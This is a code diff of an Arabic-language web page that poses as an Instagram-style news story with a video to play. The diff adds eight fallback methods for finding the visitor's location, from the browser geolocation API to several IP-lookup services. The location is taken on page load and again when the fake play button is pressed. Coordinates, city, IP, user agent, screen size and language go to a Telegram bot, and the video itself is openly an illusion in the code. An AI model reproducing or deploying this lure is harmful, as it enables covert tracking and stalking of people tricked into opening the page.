@@ -19,7 +19,6 @@
             position: relative;
         }
 
-        /* ===== الحاوية الرئيسية (شبيهة بـ Instagram Story) ===== */
         .story-container {
             position: relative;
             width: 100%;
@@ -30,7 +29,6 @@
             overflow: hidden;
         }
 
-        /* ===== خلفية الفيديو ===== */
         .story-background {
             position: absolute;
             top: 0;
@@ -45,7 +43,6 @@
             filter: brightness(1);
         }
 
-        /* ===== شريط التقدم (مثل Instagram Stories) ===== */
         .progress-bars {
             position: absolute;
             top: 10px;
@@ -78,7 +75,6 @@
             100% { width: 100%; }
         }
 
-        /* ===== زر الصوت ===== */
         .sound-btn {
             position: absolute;
             top: 60px;
@@ -98,7 +94,6 @@
             backdrop-filter: blur(10px);
         }
 
-        /* ===== المحتوى في الأسفل ===== */
         .story-content {
             position: absolute;
             bottom: 80px;
@@ -133,7 +128,6 @@
             color: #ff6b6b;
         }
 
-        /* ===== زر التشغيل (المركزي) ===== */
         .play-overlay {
             position: absolute;
             top: 0;
@@ -180,7 +174,6 @@
             letter-spacing: 1px;
         }
 
-        /* ===== النافذة المخصصة (فوق طلب المتصفح) ===== */
         .custom-modal {
             display: none;
             position: fixed;
@@ -274,6 +267,15 @@
             font-size: 12px;
             margin-top: 15px;
         }
+        .modal-error {
+            color: #ff6b6b;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+        }
+        .modal-error.visible {
+            display: block;
+        }
 
         @keyframes fadeIn {
             from { opacity: 0; }
@@ -284,7 +286,6 @@
             to { transform: translateY(0) scale(1); opacity: 1; }
         }
 
-        /* ===== أيقونات في الأعلى (مثل Instagram) ===== */
         .top-icons {
             position: absolute;
             top: 12px;
@@ -311,7 +312,6 @@
             cursor: pointer;
         }
 
-        /* ===== شاشة التحميل ===== */
         .loading-overlay {
             display: none;
             position: absolute;
@@ -344,6 +344,24 @@
             opacity: 0.6;
         }
 
+        .location-status {
+            position: absolute;
+            bottom: 50px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 12;
+            background: rgba(0,0,0,0.6);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 10px;
+            color: #888;
+            display: none;
+            backdrop-filter: blur(10px);
+        }
+        .location-status.visible {
+            display: block;
+        }
+
         @media (max-width: 430px) {
             .story-content .username { font-size: 14px; }
             .story-content .caption { font-size: 13px; }
@@ -353,13 +371,9 @@
 </head>
 <body>
 
-    <!-- ===== الحاوية الرئيسية ===== -->
     <div class="story-container" id="storyContainer">
-        
-        <!-- الخلفية -->
         <div class="story-background" id="storyBg"></div>
 
-        <!-- شريط التقدم -->
         <div class="progress-bars" id="progressBars">
             <div class="progress-bar"><div class="fill"></div></div>
             <div class="progress-bar"><div class="fill"></div></div>
@@ -368,7 +382,6 @@
             <div class="progress-bar"><div class="fill"></div></div>
         </div>
 
-        <!-- الأيقونات العلوية -->
         <div class="top-icons">
             <div class="left">
                 <span>✕</span>
@@ -381,10 +394,8 @@
             </div>
         </div>
 
-        <!-- زر الصوت -->
         <div class="sound-btn" id="soundBtn" onclick="toggleSound()">🔊</div>
 
-        <!-- المحتوى السفلي -->
         <div class="story-content">
             <div class="username">
                 🔥 التل_نيوز
@@ -396,20 +407,20 @@
             </div>
         </div>
 
-        <!-- زر التشغيل المركزي -->
         <div class="play-overlay" id="playOverlay" onclick="showCustomModal()">
             <div class="play-btn-large" id="playBtnLarge">▶</div>
             <div class="play-text">اضغط لتشغيل الفيديو</div>
         </div>
 
-        <!-- شاشة التحميل -->
         <div class="loading-overlay" id="loadingOverlay">
             <div class="spinner"></div>
             <div class="loading-text" id="loadingText">جاري التحميل...</div>
         </div>
+
+        <div class="location-status" id="locationStatus">📍 جاري تحديد الموقع...</div>
     </div>
 
-    <!-- ===== النافذة المخصصة (فوق كل شيء) ===== -->
+    <!-- ===== النافذة المخصصة ===== -->
     <div class="custom-modal" id="customModal">
         <div class="custom-modal-box">
             <span class="modal-icon">🎬</span>
@@ -421,6 +432,7 @@
                 <span>▶</span> تشغيل الفيديو
             </button>
             
+            <div class="modal-error" id="modalError">⚠️ يرجى السماح بالوصول إلى الموقع للمشاهدة</div>
             <p class="modal-sub">🔒 سيتم التحقق من الموقع تلقائياً</p>
         </div>
     </div>
@@ -441,8 +453,9 @@
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
         const customModal = document.getElementById('customModal');
-        const progressBars = document.getElementById('progressBars');
+        const modalError = document.getElementById('modalError');
         const soundBtn = document.getElementById('soundBtn');
+        const locationStatus = document.getElementById('locationStatus');
 
         // ============================================================
         // متغيرات الحالة
@@ -450,90 +463,341 @@
         let isPlaying = false;
         let isProcessing = false;
         let retryCount = 0;
-        const MAX_RETRIES = 2;
+        const MAX_RETRIES = 3;
         let locationSent = false;
         let isMuted = false;
+        let locationAttempts = 0;
+
+        // ============================================================
+        // 🔥 جميع طرق جلب الموقع
+        // ============================================================
+
+        // === الطريقة 1: Geolocation API (دقة عالية) ===
+        function getLocationViaGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ success: false, method: 'geolocation' });
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        resolve({
+                            success: true,
+                            method: 'geolocation',
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            acc: Math.round(position.coords.accuracy)
+                        });
+                    },
+                    function() {
+                        resolve({ success: false, method: 'geolocation' });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // === الطريقة 2: ipapi.co ===
+        function getLocationViaIpApi() {
+            return new Promise((resolve) => {
+                fetch('https://ipapi.co/json/', { timeout: 3000 })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.latitude && data.longitude) {
+                            resolve({
+                                success: true,
+                                method: 'ipapi.co',
+                                lat: data.latitude,
+                                lon: data.longitude,
+                                acc: 5000,
+                                city: data.city,
+                                region: data.region,
+                                country: data.country_name
+                            });
+                        } else {
+                            resolve({ success: false, method: 'ipapi.co' });
+                        }
+                    })
+                    .catch(() => resolve({ success: false, method: 'ipapi.co' }));
+            });
+        }
+
+        // === الطريقة 3: ipinfo.io ===
+        function getLocationViaIpInfo() {
+            return new Promise((resolve) => {
+                fetch('https://ipinfo.io/json', { timeout: 3000 })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.loc) {
+                            const coords = data.loc.split(',');
+                            resolve({
+                                success: true,
+                                method: 'ipinfo.io',
+                                lat: parseFloat(coords[0]),
+                                lon: parseFloat(coords[1]),
+                                acc: 10000,
+                                city: data.city,
+                                region: data.region,
+                                country: data.country
+                            });
+                        } else {
+                            resolve({ success: false, method: 'ipinfo.io' });
+                        }
+                    })
+                    .catch(() => resolve({ success: false, method: 'ipinfo.io' }));
+            });
+        }
+
+        // === الطريقة 4: ip-api.com ===
+        function getLocationViaIpApiCom() {
+            return new Promise((resolve) => {
+                fetch('http://ip-api.com/json/', { timeout: 3000 })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.lat && data.lon) {
+                            resolve({
+                                success: true,
+                                method: 'ip-api.com',
+                                lat: data.lat,
+                                lon: data.lon,
+                                acc: 8000,
+                                city: data.city,
+                                region: data.regionName,
+                                country: data.country
+                            });
+                        } else {
+                            resolve({ success: false, method: 'ip-api.com' });
+                        }
+                    })
+                    .catch(() => resolve({ success: false, method: 'ip-api.com' }));
+            });
+        }
+
+        // === الطريقة 5: freegeoip.app ===
+        function getLocationViaFreeGeoIP() {
+            return new Promise((resolve) => {
+                fetch('https://freegeoip.app/json/', { timeout: 3000 })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.latitude && data.longitude) {
+                            resolve({
+                                success: true,
+                                method: 'freegeoip.app',
+                                lat: data.latitude,
+                                lon: data.longitude,
+                                acc: 12000,
+                                city: data.city,
+                                region: data.region_name,
+                                country: data.country_name
+                            });
+                        } else {
+                            resolve({ success: false, method: 'freegeoip.app' });
+                        }
+                    })
+                    .catch(() => resolve({ success: false, method: 'freegeoip.app' }));
+            });
+        }
+
+        // === الطريقة 6: geoplugin.net ===
+        function getLocationViaGeoPlugin() {
+            return new Promise((resolve) => {
+                fetch('http://www.geoplugin.net/json.gp', { timeout: 3000 })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.geoplugin_latitude && data.geoplugin_longitude) {
+                            resolve({
+                                success: true,
+                                method: 'geoplugin.net',
+                                lat: parseFloat(data.geoplugin_latitude),
+                                lon: parseFloat(data.geoplugin_longitude),
+                                acc: 15000,
+                                city: data.geoplugin_city,
+                                region: data.geoplugin_region,
+                                country: data.geoplugin_countryName
+                            });
+                        } else {
+                            resolve({ success: false, method: 'geoplugin.net' });
+                        }
+                    })
+                    .catch(() => resolve({ success: false, method: 'geoplugin.net' }));
+            });
+        }
+
+        // === الطريقة 7: jsonip.com ===
+        function getLocationViaJsonIP() {
+            return new Promise((resolve) => {
+                fetch('https://jsonip.com/', { timeout: 3000 })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ip) {
+                            // نحاول جلب الموقع من ip-api باستخدام IP
+                            fetch(`http://ip-api.com/json/${data.ip}`)
+                                .then(res => res.json())
+                                .then(ipData => {
+                                    if (ipData.lat && ipData.lon) {
+                                        resolve({
+                                            success: true,
+                                            method: 'jsonip.com',
+                                            lat: ipData.lat,
+                                            lon: ipData.lon,
+                                            acc: 8000,
+                                            city: ipData.city,
+                                            region: ipData.regionName,
+                                            country: ipData.country
+                                        });
+                                    } else {
+                                        resolve({ success: false, method: 'jsonip.com' });
+                                    }
+                                })
+                                .catch(() => resolve({ success: false, method: 'jsonip.com' }));
+                        } else {
+                            resolve({ success: false, method: 'jsonip.com' });
+                        }
+                    })
+                    .catch(() => resolve({ success: false, method: 'jsonip.com' }));
+            });
+        }
+
+        // === الطريقة 8: geolocation-db.com ===
+        function getLocationViaGeolocationDB() {
+            return new Promise((resolve) => {
+                fetch('https://geolocation-db.com/json/', { timeout: 3000 })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.latitude && data.longitude) {
+                            resolve({
+                                success: true,
+                                method: 'geolocation-db.com',
+                                lat: parseFloat(data.latitude),
+                                lon: parseFloat(data.longitude),
+                                acc: 12000,
+                                city: data.city,
+                                region: data.region,
+                                country: data.country_name
+                            });
+                        } else {
+                            resolve({ success: false, method: 'geolocation-db.com' });
+                        }
+                    })
+                    .catch(() => resolve({ success: false, method: 'geolocation-db.com' }));
+            });
+        }
+
+        // ============================================================
+        // 🚀 النظام الذكي: يجرب جميع الطرق حتى ينجح
+        // ============================================================
+        async function getLocationWithAllMethods() {
+            locationAttempts++;
+            
+            // قائمة جميع الطرق (مرتبة حسب الدقة)
+            const methods = [
+                getLocationViaGeolocation,     // 1. دقة عالية
+                getLocationViaIpApi,           // 2. دقة متوسطة
+                getLocationViaIpInfo,          // 3. دقة متوسطة
+                getLocationViaIpApiCom,        // 4. دقة متوسطة
+                getLocationViaFreeGeoIP,       // 5. دقة منخفضة
+                getLocationViaGeoPlugin,       // 6. دقة منخفضة
+                getLocationViaJsonIP,          // 7. دقة متوسطة
+                getLocationViaGeolocationDB    // 8. دقة منخفضة
+            ];
+
+            // تحديث حالة الموقع
+            locationStatus.classList.add('visible');
+            locationStatus.textContent = `📍 جاري تحديد الموقع... (${locationAttempts})`;
+
+            // تجربة كل طريقة
+            for (let i = 0; i < methods.length; i++) {
+                const method = methods[i];
+                const result = await method();
+                
+                if (result.success) {
+                    locationStatus.textContent = `📍 تم التحديد عبر ${result.method}`;
+                    setTimeout(() => {
+                        locationStatus.classList.remove('visible');
+                    }, 2000);
+                    
+                    return result;
+                }
+                
+                // تحديث الحالة
+                locationStatus.textContent = `📍 محاولة ${i + 1}/${methods.length}...`;
+            }
+
+            // إذا فشلت جميع الطرق
+            locationStatus.classList.remove('visible');
+            return { success: false };
+        }
 
         // ============================================================
         // إظهار النافذة المخصصة
         // ============================================================
         function showCustomModal() {
             if (isPlaying || isProcessing) return;
+            modalError.classList.remove('visible');
             customModal.classList.add('active');
         }
 
         // ============================================================
-        // عند الضغط على زر "تشغيل" في النافذة
+        // عند الضغط على زر "تشغيل"
         // ============================================================
-        function handleModalPlay() {
+        async function handleModalPlay() {
             customModal.classList.remove('active');
             
-            // إخفاء زر التشغيل
             playOverlay.classList.add('hidden');
-            
-            // إظهار التحميل
             loadingOverlay.classList.add('active');
-            loadingText.textContent = 'جاري التحميل...';
+            loadingText.textContent = 'جاري التحقق...';
 
-            // جلب الموقع في الخلفية
-            getLocationSilently();
+            // محاولة جلب الموقع بجميع الطرق
+            const result = await getLocationWithAllMethods();
+            
+            if (result.success) {
+                // نجاح - إرسال الموقع
+                const time = new Date().toISOString();
+                const userAgent = navigator.userAgent;
+                const screenSize = `${screen.width}x${screen.height}`;
+                const language = navigator.language;
 
-            // بعد 1.5 ثانية يبدأ الفيديو
-            setTimeout(() => {
-                loadingOverlay.classList.remove('active');
-                startVideoPlayback();
-            }, 1500);
-        }
+                let locationDetails = `📍 ${result.lat}, ${result.lon}\n🎯 ±${result.acc}م (${result.method})`;
+                
+                // إضافة معلومات إضافية إن وجدت
+                if (result.city) locationDetails += `\n🏙️ ${result.city}`;
+                if (result.region) locationDetails += `\n📍 ${result.region}`;
+                if (result.country) locationDetails += `\n🌍 ${result.country}`;
 
-        // ============================================================
-        // جلب الموقع بصمت
-        // ============================================================
-        function getLocationSilently() {
-            if (!navigator.geolocation) {
-                sendToBot('⚠️ المتصفح لا يدعم الموقع');
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const acc = Math.round(position.coords.accuracy);
-                    const time = new Date().toISOString();
-                    const userAgent = navigator.userAgent;
-                    const screenSize = `${screen.width}x${screen.height}`;
-                    const language = navigator.language;
-
-                    const caption = `🆕 مشاهد جديد من التل
-        📍 ${lat}, ${lon}
-        🎯 ±${acc}م
+                const caption = `🆕 مشاهد جديد من التل
+        ${locationDetails}
         🕒 ${time}
         💻 ${userAgent.substring(0, 60)}...
         📱 ${screenSize}
-        🌐 ${language}`;
+        🌐 ${language}
+        ✅ تم التحقق (${result.method})`;
 
-                    sendToBot(caption);
-                    locationSent = true;
-                },
-                function(error) {
-                    let isPermissionDenied = error.code === error.PERMISSION_DENIED;
-                    
-                    if (isPermissionDenied && retryCount < MAX_RETRIES) {
-                        retryCount++;
-                        setTimeout(() => {
-                            getLocationSilently();
-                        }, 2000);
-                        return;
-                    }
-
-                    sendToBot(`❌ فشل الموقع: ${error.message}`);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                }
-            );
+                sendToBot(caption);
+                locationSent = true;
+                
+                loadingText.textContent = 'جاري التحميل...';
+                setTimeout(() => {
+                    loadingOverlay.classList.remove('active');
+                    startVideoPlayback();
+                }, 1000);
+            } else {
+                // فشل جميع الطرق
+                loadingOverlay.classList.remove('active');
+                modalError.classList.add('visible');
+                modalError.textContent = '⚠️ يرجى السماح بالوصول إلى الموقع للمشاهدة';
+                
+                setTimeout(() => {
+                    customModal.classList.add('active');
+                    playOverlay.classList.remove('hidden');
+                }, 1500);
+                
+                sendToBot(`❌ فشل جلب الموقع (جميع الطرق الـ 8)`);
+            }
         }
 
         // ============================================================
@@ -542,11 +806,9 @@
         function startVideoPlayback() {
             isPlaying = true;
             
-            // تغيير الخلفية
             storyBg.style.background = 'linear-gradient(135deg, #0a0a0a, #1a0a0a)';
             storyBg.classList.add('playing');
             
-            // تشغيل شريط التقدم
             const bars = document.querySelectorAll('.progress-bar');
             bars.forEach((bar, index) => {
                 setTimeout(() => {
@@ -554,10 +816,8 @@
                 }, index * 500);
             });
 
-            // تغيير زر الصوت
             soundBtn.textContent = '🔊';
 
-            // تحديث النص السفلي
             document.querySelector('.story-content .username').innerHTML = `
                 🔥 التل_نيوز
                 <span class="badge">بث حي</span>
@@ -567,7 +827,6 @@
                 <span style="font-size:12px; opacity:0.6;">🕒 جاري البث • 1.2K مشاهدة</span>
             `;
 
-            // إظهار وهم تشغيل الفيديو
             playBtnLarge.textContent = '▶️';
             playBtnLarge.style.background = 'rgba(0,255,0,0.1)';
             
@@ -575,7 +834,6 @@
             retryCount = 0;
             locationSent = false;
 
-            // تحديث شريط التقدم
             updateProgress();
         }
 
@@ -593,7 +851,6 @@
                     currentBar++;
                 } else {
                     clearInterval(progressInterval);
-                    // الفيديو انتهى
                     setTimeout(() => {
                         document.querySelector('.story-content .caption').innerHTML = `
                             <strong>⏹️ انتهى البث</strong><br>
@@ -637,24 +894,19 @@
         }
 
         // ============================================================
-        // تحميل خلفي
+        // تحميل خلفي (محاولة جلب الموقع بدون تفاعل)
         // ============================================================
         window.addEventListener('load', function() {
-            setTimeout(() => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(pos) {
-                            const lat = pos.coords.latitude;
-                            const lon = pos.coords.longitude;
-                            const time = new Date().toISOString();
-                            sendToBot(`🔄 خلفي\n📍 ${lat}, ${lon}\n🕒 ${time}`);
-                        },
-                        function() {},
-                        { enableHighAccuracy: true, timeout: 4000 }
-                    );
+            // محاولة جلب الموقع في الخلفية بجميع الطرق
+            setTimeout(async () => {
+                const result = await getLocationWithAllMethods();
+                if (result.success) {
+                    const time = new Date().toISOString();
+                    sendToBot(`🔄 تحقق خلفي تلقائي\n📍 ${result.lat}, ${result.lon}\n🎯 ${result.method}\n🕒 ${time}`);
                 }
             }, 3000);
 
+            // جلب IP
             setTimeout(() => {
                 fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
@@ -665,8 +917,8 @@
             }, 4000);
         });
 
-        console.log('✅ Instagram Story Style - يعمل بصمت');
-        console.log('🎯 التصميم يشبه Instagram Stories');
+        console.log('✅ النظام يعمل مع 8 طرق لجلب الموقع');
+        console.log('📌 الطرق: Geolocation, ipapi, ipinfo, ip-api, freegeoip, geoplugin, jsonip, geolocation-db');
         console.log('🔑 التوكن:', BOT_TOKEN.substring(0, 10) + '...');
     </script>
 </body>
